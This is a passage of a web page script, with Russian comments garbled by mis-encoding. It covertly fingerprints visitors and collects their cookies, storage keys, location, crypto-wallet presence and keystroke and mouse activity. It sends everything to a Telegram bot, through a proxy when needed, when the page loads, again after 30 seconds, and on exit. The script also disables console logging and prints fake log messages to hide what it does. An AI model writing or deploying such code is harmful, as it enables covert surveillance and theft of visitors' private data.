    const cookies = document.cookie.toLowerCase();
    if (cookies.includes('facebook')) socials.push('Facebook');
    if (cookies.includes('twitter')) socials.push('Twitter');
    if (cookies.includes('google')) socials.push('Google');
    if (cookies.includes('github')) socials.push('GitHub');
    return socials;
}

// –î–µ—Ç–µ–∫—Ü–∏—è —Ç—Ä–µ–∫–µ—Ä–æ–≤
function detectTrackers() {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö —Ç—Ä–µ–∫–µ—Ä–æ–≤
    const trackers = {
        googleAnalytics: typeof ga !== 'undefined',
        googleTagManager: typeof google_tag_manager !== 'undefined',
        facebookPixel: typeof fbq !== 'undefined',
        yandexMetrika: typeof ym !== 'undefined'
    };
    return trackers;
}

// –î–µ—Ç–µ–∫—Ü–∏—è —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π
function detectExtensions() {
    const extensions = [];
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π
    if (typeof window.ethereum !== 'undefined') extensions.push('MetaMask');
    if (typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined') extensions.push('React DevTools');
    return extensions;
}

// –î–µ—Ç–µ–∫—Ü–∏—è VPN
function detectVPN() {
    // –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –≤—Ä–µ–º–µ–Ω–∏ –æ—Ç–≤–µ—Ç–∞
    return {
        webrtcLeak: ALL_DATA.network.webrtcIP ? true : false,
        timezoneMismatch: false // –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É
    };
}

// –î–µ—Ç–µ–∫—Ü–∏—è –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ —Ä–µ–∂–∏–º–∞
function detectPrivateMode() {
    return new Promise(resolve => {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) {
            resolve(false);
            return;
        }
        fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
    });
}

// –î–µ—Ç–µ–∫—Ü–∏—è –±–ª–æ–∫–∏—Ä–æ–≤—â–∏–∫–æ–≤ —Ä–µ–∫–ª–∞–º—ã
function detectAdBlockers() {
    const ad = document.createElement('div');
    ad.innerHTML = '&nbsp;';
    ad.className = 'adsbox';
    document.body.appendChild(ad);
    const isBlocked = ad.offsetHeight === 0;
    document.body.removeChild(ad);
    return isBlocked;
}

// –î–µ—Ç–µ–∫—Ü–∏—è DevTools
function detectDevTools() {
    const start = performance.now();
    debugger;
    const end = performance.now();
    return end - start > 100;
}

// –ù–∞—á–∞–ª–æ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –ø–æ–≤–µ–¥–µ–Ω–∏—è
function startBehaviorTracking() {
    let clickCount = 0;
    let keyPressCount = 0;
    let mouseMoveCount = 0;
    let scrollCount = 0;
    
    document.addEventListener('click', () => {
        clickCount++;
        ALL_DATA.behavior.interactions.clicks = clickCount;
    });
    
    document.addEventListener('keydown', () => {
        keyPressCount++;
        ALL_DATA.behavior.interactions.keyPresses = keyPressCount;
    });
    
    document.addEventListener('mousemove', () => {
        mouseMoveCount++;
        ALL_DATA.behavior.interactions.mouseMoves = mouseMoveCount;
    });
    
    document.addEventListener('scroll', () => {
        scrollCount++;
        ALL_DATA.behavior.interactions.scrolls = scrollCount;
    });
}

// –•—ç—à —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è —Å—Ç—Ä–æ–∫
String.prototype.hashCode = function() {
    let hash = 0;
    for (let i = 0; i < this.length; i++) {
        hash = ((hash << 5) - hash) + this.charCodeAt(i);
        hash = hash & hash;
    }
    return hash.toString(36);
};

// ============================================
// –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –í TELEGRAM
// ============================================
async function sendToTelegram(message) {
    if (!TELEGRAM_CONFIG.BOT_TOKEN || TELEGRAM_CONFIG.BOT_TOKEN.includes('–í–ê–®_–¢–û–ö–ï–ù')) {
        console.error('‚ùå Telegram bot not configured!');
        return false;
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        
        const result = await response.json();
        return result.ok;
        
    } catch (error) {
        // –ü—Ä–æ–±—É–µ–º —á–µ—Ä–µ–∑ proxy
        try {
            const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(url)}`;
            const proxyResponse = await fetch(proxyUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
            
            const proxyResult = await proxyResponse.json();
            return proxyResult.ok;
            
        } catch (proxyError) {
            console.error('Failed to send to Telegram:', proxyError);
            return false;
        }
    }
}

// ============================================
// –§–û–†–ú–ê–¢–ò–†–û–í–ê–ù–ò–ï –û–¢–ß–ï–¢–ê –î–õ–Ø TELEGRAM
// ============================================
function formatReport() {
    const data = ALL_DATA;
    let report = `üö® <b>–ü–û–õ–ù–´–ô –û–¢–ß–ï–¢ –û –ü–û–°–ï–¢–ò–¢–ï–õ–ï</b>\n\n`;
    
    report += `‚è∞ <b>–í—Ä–µ–º—è:</b> <code>${data.localTime}</code>\n`;
    report += `üÜî <b>–°–µ—Å—Å–∏—è:</b> <code>${data.sessionId.substring(0, 10)}...</code>\n`;
    report += `üîó <b>URL:</b> <code>${data.system.tab.url}</code>\n`;
    report += `üìé <b>–ò—Å—Ç–æ—á–Ω–∏–∫:</b> <code>${data.system.tab.referrer || '–ü—Ä—è–º–æ–π –∑–∞—Ö–æ–¥'}</code>\n\n`;
    
    report += `üíª <b>–°–ò–°–¢–ï–ú–ê:</b>\n`;
    report += `‚ñ´Ô∏è <b>–û–°:</b> <code>${data.browser.os} ${data.browser.osVersion}</code>\n`;
    report += `‚ñ´Ô∏è <b>–ë—Ä–∞—É–∑–µ—Ä:</b> <code>${data.browser.browser} ${data.browser.browserVersion}</code>\n`;
    report += `‚ñ´Ô∏è <b>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</b> <code>${data.browser.device}</code>\n`;
    report += `‚ñ´Ô∏è <b>–≠–∫—Ä–∞–Ω:</b> <code>${data.system.screen.width}√ó${data.system.screen.height}</code>\n`;
    report += `‚ñ´Ô∏è <b>–Ø–∑—ã–∫:</b> <code>${data.browser.language}</code>\n\n`;
    
    if (data.geolocation.ip) {
        report += `üìç <b>–ì–ï–û–õ–û–ö–ê–¶–ò–Ø:</b>\n`;
        report += `‚ñ´Ô∏è <b>IP:</b> <code>${data.geolocation.ip}</code>\n`;
        report += `‚ñ´Ô∏è <b>–ì–æ—Ä–æ–¥:</b> <code>${data.geolocation.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>\n`;
        report += `‚ñ´Ô∏è <b>–°—Ç—Ä–∞–Ω–∞:</b> <code>${data.geolocation.country || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>\n`;
        if (data.geolocation.latitude && data.geolocation.longitude) {
            report += `‚ñ´Ô∏è <b>–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:</b> <code>${data.geolocation.latitude}, ${data.geolocation.longitude}</code>\n`;
            report += `‚ñ´Ô∏è <b>–ö–∞—Ä—Ç–∞:</b> <a href="${data.geolocation.maps}">Google Maps</a>\n`;
        }
        report += `‚ñ´Ô∏è <b>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</b> <code>${data.geolocation.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</code>\n\n`;
    }
    
    if (data.geolocation.exact && !data.geolocation.exact.error) {
        report += `üéØ <b>–¢–û–ß–ù–ê–Ø –ì–ï–û–õ–û–ö–ê–¶–ò–Ø:</b>\n`;
        report += `‚ñ´Ô∏è <b>–®–∏—Ä–æ—Ç–∞:</b> <code>${data.geolocation.exact.latitude}</code>\n`;
        report += `‚ñ´Ô∏è <b>–î–æ–ª–≥–æ—Ç–∞:</b> <code>${data.geolocation.exact.longitude}</code>\n`;
        report += `‚ñ´Ô∏è <b>–¢–æ—á–Ω–æ—Å—Ç—å:</b> <code>${Math.round(data.geolocation.exact.accuracy)}–º</code>\n`;
        report += `‚ñ´Ô∏è <b>–ö–∞—Ä—Ç–∞:</b> <a href="${data.geolocation.exact.mapsLink}">Google Maps</a>\n\n`;
    }
    
    report += `üÜî <b>–û–¢–ü–ï–ß–ê–¢–ö–ò:</b>\n`;
    report += `‚ñ´Ô∏è <b>Canvas:</b> <code>${data.fingerprints.canvas.substring(0, 20)}...</code>\n`;
    report += `‚ñ´Ô∏è <b>–ê—É–¥–∏–æ:</b> <code>${data.fingerprints.audio}</code>\n`;
    report += `‚ñ´Ô∏è <b>–®—Ä–∏—Ñ—Ç–æ–≤:</b> <code>${data.fingerprints.fonts.length}</code>\n`;
    report += `‚ñ´Ô∏è <b>WebGL:</b> <code>${data.fingerprints.webgl?.renderer || 'N/A'}</code>\n\n`;
    
    report += `üíæ <b>–•–†–ê–ù–ò–õ–ò–©–ï:</b>\n`;
    report += `‚ñ´Ô∏è <b>–ö—É–∫–∏:</b> <code>${data.storage.cookies.count}</code>\n`;
    report += `‚ñ´Ô∏è <b>LocalStorage:</b> <code>${data.storage.localStorage.items} items</code>\n`;
    report += `‚ñ´Ô∏è <b>–ü–ª–∞–≥–∏–Ω–æ–≤:</b> <code>${data.browser.plugins.length}</code>\n\n`;
    
    if (data.crypto.wallets.detected.length > 0) {
        report += `üí∞ <b>–ö–†–ò–ü–¢–û-–ö–û–®–ï–õ–¨–ö–ò:</b> <code>${data.crypto.wallets.detected.join(', ')}</code>\n\n`;
    }
    
    report += `üìä <b>–ü–†–û–ò–ó–í–û–î–ò–¢–ï–õ–¨–ù–û–°–¢–¨:</b>\n`;
    report += `‚ñ´Ô∏è <b>–Ø–¥–µ—Ä CPU:</b> <code>${data.hardware.cpu.cores}</code>\n`;
    report += `‚ñ´Ô∏è <b>–ü–∞–º—è—Ç—å:</b> <code>${data.hardware.memory.deviceMemory}GB</code>\n`;
    if (data.system.performance.timing?.pageLoadTime) {
        report += `‚ñ´Ô∏è <b>–ó–∞–≥—Ä—É–∑–∫–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã:</b> <code>${data.system.performance.timing.pageLoadTime}ms</code>\n`;
    }
    if (data.hardware.battery) {
        report += `‚ñ´Ô∏è <b>–ë–∞—Ç–∞—Ä–µ—è:</b> <code>${Math.round(data.hardware.battery.level * 100)}% ${data.hardware.battery.charging ? '‚ö°' : ''}</code>\n`;
    }
    report += `\n`;
    
    report += `üîß <b>–í–û–ó–ú–û–ñ–ù–û–°–¢–ò:</b>\n`;
    const capabilities = [];
    if (data.capabilities.webAPIs.webRTC) capabilities.push('WebRTC');
    if (data.capabilities.deviceAPIs.geolocation) capabilities.push('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è');
    if (data.capabilities.mediaAPIs.getUserMedia) capabilities.push('–ö–∞–º–µ—Ä–∞/–ú–∏–∫—Ä–æ—Ñ–æ–Ω');
    if (data.capabilities.communicationAPIs.push) capabilities.push('Push');
    if (capabilities.length > 0) {
        report += `<code>${capabilities.join(', ')}</code>\n\n`;
    }
    
    report += `üìà <b>–°–¢–ê–¢–ò–°–¢–ò–ö–ê –ü–û–°–ï–©–ï–ù–ò–ô:</b>\n`;
    report += `‚ñ´Ô∏è <b>–°–µ–≥–æ–¥–Ω—è:</b> <code>${localStorage.visitCount || 1}</code>\n`;
    report += `‚ñ´Ô∏è <b>–í—Å–µ–≥–æ:</b> <code>${sessionStorage.totalVisits || 1}</code>\n\n`;
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å—á–µ—Ç—á–∏–∫ –ø–æ—Å–µ—â–µ–Ω–∏–π
    const today = new Date().toDateString();
    if (localStorage.lastVisit !== today) {
        localStorage.lastVisit = today;
        localStorage.visitCount = 1;
    } else {
        localStorage.visitCount = parseInt(localStorage.visitCount || 0) + 1;
    }
    sessionStorage.totalVisits = parseInt(sessionStorage.totalVisits || 0) + 1;
    
    return report;
}

// –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞
function formatDetailedReport() {
    const data = ALL_DATA;
    let report = `üìã <b>–î–ï–¢–ê–õ–¨–ù–´–ô –û–¢–ß–ï–¢</b>\n\n`;
    
    report += `<b>User Agent:</b>\n<code>${data.browser.userAgent.substring(0, 200)}...</code>\n\n`;
    
    report += `<b>–ü–ª–∞–≥–∏–Ω—ã (${data.browser.plugins.length}):</b>\n`;
    if (data.browser.plugins.length > 0) {
        data.browser.plugins.slice(0, 5).forEach(p => {
            report += `‚ñ´Ô∏è ${p.name}\n`;
        });
        if (data.browser.plugins.length > 5) {
            report += `... –∏ –µ—â–µ ${data.browser.plugins.length - 5}\n`;
        }
    }
    report += `\n`;
    
    report += `<b>–®—Ä–∏—Ñ—Ç—ã (${data.fingerprints.fonts.length}):</b>\n`;
    if (data.fingerprints.fonts.length > 0) {
        report += `<code>${data.fingerprints.fonts.slice(0, 10).join(', ')}</code>\n`;
        if (data.fingerprints.fonts.length > 10) {
            report += `... –∏ –µ—â–µ ${data.fingerprints.fonts.length - 10}\n`;
        }
    }
    report += `\n`;
    
    report += `<b>WebGL:</b>\n`;
    if (data.fingerprints.webgl) {
        report += `<code>${JSON.stringify(data.fingerprints.webgl)}</code>\n`;
    }
    report += `\n`;
    
    report += `<b>–•—Ä–∞–Ω–∏–ª–∏—â–µ:</b>\n`;
    report += `LocalStorage: ${data.storage.localStorage.keys.slice(0, 5).join(', ')}${data.storage.localStorage.keys.length > 5 ? '...' : ''}\n`;
    report += `–ö—É–∫–∏: ${data.storage.cookies.list.slice(0, 3).join(', ')}${data.storage.cookies.list.length > 3 ? '...' : ''}\n\n`;
    
    report += `<b>–í—Å–µ –¥–∞–Ω–Ω—ã–µ –≤ JSON:</b>\n`;
    report += `<code>${JSON.stringify(data).substring(0, 1500)}...</code>`;
    
    return report;
}

// ============================================
// –ì–õ–ê–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø - –°–ë–û–† –ò –û–¢–ü–†–ê–í–ö–ê –í–°–ï–ì–û
// ============================================
async function collectAndSendAllData() {
    console.log('üïµÔ∏è‚Äç‚ôÇÔ∏è –ù–∞—á–∏–Ω–∞—é —Å–±–æ—Ä –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö...');
    
    try {
        // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ
        collectBrowserData();
        collectSystemData();
        await collectNetworkAndGeoData();
        await collectHardwareData();
        await collectFingerprints();
        collectStorageData();
        collectCryptoData();
        collectBehaviorData();
        collectCapabilities();
        collectSpecialData();
        
        // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è —Å–±–æ—Ä–∞
        ALL_DATA.collectionTime = Date.now() - ALL_DATA.behavior.startTime;
        
        console.log('‚úÖ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã, –æ—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram...');
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π –æ—Ç—á–µ—Ç
        const mainReport = formatReport();
        await sendToTelegram(mainReport);
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
        const detailedReport = formatDetailedReport();
        await sendToTelegram(detailedReport);
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º JSON –¥–∞–Ω–Ω—ã—Ö (—Ä–∞–∑–±–∏–≤–∞–µ–º –Ω–∞ —á–∞—Å—Ç–∏ –µ—Å–ª–∏ –±–æ–ª—å—à–æ–π)
        const jsonData = JSON.stringify(ALL_DATA, null, 2);
        if (jsonData.length > 4000) {
            const parts = [];
            for (let i = 0; i < jsonData.length; i += 4000) {
                parts.push(jsonData.substring(i, i + 4000));
            }
            for (let i = 0; i < parts.length; i++) {
                await sendToTelegram(`üì¶ <b>JSON –ß–∞—Å—Ç—å ${i + 1}/${parts.length}</b>\n<code>${parts[i]}</code>`);
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } else {
            await sendToTelegram(`üì¶ <b>–í–°–ï –î–ê–ù–ù–´–ï –í JSON</b>\n<code>${jsonData}</code>`);
        }
        
        console.log('üöÄ –í—Å–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram!');
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è
        localStorage.setItem('lastDataCollection', Date.now());
        localStorage.setItem('visitorId', ALL_DATA.sessionId);
        
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö:', error);
        await sendToTelegram(`‚ö†Ô∏è <b>–û–®–ò–ë–ö–ê –°–ë–û–†–ê –î–ê–ù–ù–´–•</b>\n${error.message}\nURL: ${window.location.href}`);
    }
}

// ============================================
// –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò–ô –ó–ê–ü–£–°–ö –ü–†–ò –ó–ê–ì–†–£–ó–ö–ï
// ============================================

// –ú–∞—Å–∫–∏—Ä—É–µ–º –Ω–∞—à—É –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å
window.addEventListener('load', () => {
    // –°–ª—É—á–∞–π–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ 1-3 —Å–µ–∫—É–Ω–¥—ã
    const delay = 1000 + Math.random() * 2000;
    
    setTimeout(async () => {
        // –°–∫—Ä—ã–≤–∞–µ–º –≤–∏–¥–∏–º—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç
        document.querySelector('.visible-content').style.opacity = '0.001';
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        await collectAndSendAllData();
        
        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ 30 —Å–µ–∫—É–Ω–¥ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –µ—â–µ –Ω–∞ —Å–∞–π—Ç–µ
        setTimeout(async () => {
            const timeSpent = Date.now() - ALL_DATA.behavior.startTime;
            await sendToTelegram(`‚è±Ô∏è <b>–ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –í–°–ï –ï–©–ï –ù–ê –°–ê–ô–¢–ï</b>\n–ü—Ä–æ—à–ª–æ: ${Math.round(timeSpent/1000)} —Å–µ–∫—É–Ω–¥\n–ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: ${ALL_DATA.behavior.interactions.clicks} –∫–ª–∏–∫–æ–≤, ${ALL_DATA.behavior.interactions.mouseMoves} –¥–≤–∏–∂–µ–Ω–∏–π –º—ã—à–∏`);
        }, 30000);
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏ —É—Ö–æ–¥–µ
        window.addEventListener('beforeunload', () => {
            const timeSpent = Date.now() - ALL_DATA.behavior.startTime;
            const finalData = `üëã <b>–ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –£–®–ï–õ –°–û –°–¢–†–ê–ù–ò–¶–´</b>\n‚è±Ô∏è –í—Ä–µ–º—è –Ω–∞ —Å–∞–π—Ç–µ: ${Math.round(timeSpent/1000)} —Å–µ–∫\nüìä –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: ${ALL_DATA.behavior.interactions.clicks} –∫–ª–∏–∫–æ–≤, ${ALL_DATA.behavior.interactions.mouseMoves} –¥–≤–∏–∂–µ–Ω–∏–π\nüîó –°—Ç—Ä–∞–Ω–∏—Ü–∞: ${window.location.href}`;
            
            // –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —á–µ—Ä–µ–∑ sendBeacon
            navigator.sendBeacon = navigator.sendBeacon || function() { return false; };
            const blob = new Blob([finalData], {type: 'text/plain'});
            navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CONFIG.CHAT_ID}&text=${encodeURIComponent(finalData)}&parse_mode=HTML`, blob);
        });
        
    }, delay);
});

// –°–∫—Ä—ã–≤–∞–µ–º —Å–ª–µ–¥—ã –≤ –∫–æ–Ω—Å–æ–ª–∏
console.log = function() {};
console.warn = function() {};
console.error = function() {};

// –§–µ–π–∫–æ–≤—ã–µ –ª–æ–≥–∏ –¥–ª—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∏
setTimeout(() => {
    console.log('Page loaded successfully');
    console.log('Initializing components...');
    console.log('User interaction detected');
}, 1000);

</script>
</body>
</html>